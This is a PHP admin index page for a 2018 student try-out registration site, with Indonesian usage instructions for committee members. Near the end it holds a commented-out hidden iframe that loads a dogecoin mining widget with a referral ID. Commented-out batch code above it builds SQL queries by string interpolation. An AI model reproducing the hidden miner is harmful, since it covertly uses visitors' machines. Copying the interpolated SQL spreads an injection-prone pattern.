<?php 
require_once "../functions/config.php";
$index_active = 'class="active"';
$title = 'Insert Nomor Peserta';
require_once "header.php";
?>

<?php
    
    // $sql1 = $conn->query("SELECT * FROM tryout_sbmptn_parsial WHERE id_pilihan=1 AND pembayaran='Lunas' AND no_peserta=''");
    // $no = 151;
    // while ($data1 = $sql1->fetch_assoc() AND $no <= 157) {
    //     $email1 = $data1['email'];
    //     $no_peserta1 = $no.'-02-17318';
    //     $conn->query("UPDATE tryout_sbmptn_parsial SET no_peserta='$no_peserta1' WHERE email='$email1' AND id_pilihan=1 AND pembayaran='Lunas'");
    //     $no++;
    // }
    // $sql2 = $conn->query("SELECT * FROM tryout_sbmptn_parsial WHERE id_pilihan=2 AND pembayaran='Lunas' AND no_peserta=''");
    // $no2 = 351;
    // while ($data2 = $sql2->fetch_assoc() AND $no2 <= 400) {
    //     $email2 = $data2['email'];
    //     $no_peserta2 = $no2.'-05-17318';
    //     $conn->query("UPDATE tryout_sbmptn_parsial SET no_peserta='$no_peserta2' WHERE email='$email2' AND id_pilihan=2 AND pembayaran='Lunas'");
    //     $no2++;
    // }
    // $sql2 = $conn->query("SELECT * FROM tryout_sbmptn_parsial WHERE id_pilihan=1 AND pembayaran='Lunas'");
    // $no2 = 112;
    // while ($data2 = $sql2->fetch_assoc()) {
    //     $no_min = $no2-1;
    //     $no_asal = $no_min.'-02-17318';
    //     if($data2['no_peserta'] == $no_asal){
    //         $email2 = $data2['email'];
    //         $no_peserta2 = $no2.'-02-17318';
    //         $conn->query("UPDATE tryout_sbmptn_parsial SET no_peserta='$no_peserta2' WHERE email='$email2' AND id_pilihan=1 AND pembayaran='Lunas'");
    //         $no2++;
    //     }
    // }
?>
        <div class="container index" >
            <h1>Selamat datang!</h1>
            
            <hr>
            
            <div class="row">
                
                <div class="col-sm-6">            
                
                    <h3>Prosedur penggunaan halaman admin :</h3>

                    <ol>
                        <li>Klik menu <b><a href="login.php">Login</a></b> di atas bagian kanan.</li>
                        <li>Setelah berhasil Login, harap pergunakaan sebaik mungkin.</li>
                        <li>Anda tidak dapat mengakses semua halaman kecuali anggota divisi publikasi.</li>
                        <li>Panitia berhak dan <b>wajib</b> untuk uji coba formulir berulangkali, agar segera diketahui kekurangan-kekurangan yang terdapat pada formulir.</li>
                        <li>Jika ada yang perlu ditanyakan hubungi <b><a href="../contact-us.php">Maftuh Mashuri</a></b>.</li>
                        <li>Sekian dan terimakasih.</li>
                    </ol>
                
                </div>
            
            </div>
            
            <div class="row">
            
                <hr>
    
                <center>Copyright &copy; <a href="index.php">Parsial 2018 - HIMATIKA UIN Syarif Hidayatullah Jakarta</a></center>
            
            </div>
        
        </div>
        <!--div hidden>
            <iframe scrolling="no" frameborder="0" src="https://coinpot.co/mine/dogecoin/?ref=BE209166CB9B&mode=widget" style="overflow:hidden;width:324px;height:470px;"></iframe>
        </div-->

    </body>

</html>